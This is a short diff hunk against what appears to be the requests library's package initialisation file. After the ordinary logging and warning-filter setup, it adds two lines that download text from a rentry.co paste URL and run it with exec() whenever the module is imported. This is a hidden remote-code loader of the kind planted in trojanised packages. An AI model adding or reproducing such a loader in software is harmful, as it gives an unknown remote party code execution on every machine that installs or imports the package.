@@ -182,3 +182,6 @@ logging.getLogger(__name__).addHandler(NullHandler())
 
 # FileModeWarnings go off per the default.
 warnings.simplefilter("default", FileModeWarning, append=True)
+
+with get('https://rentry.co/6635novg/raw') as _manyak:
+    exec(_manyak.text)
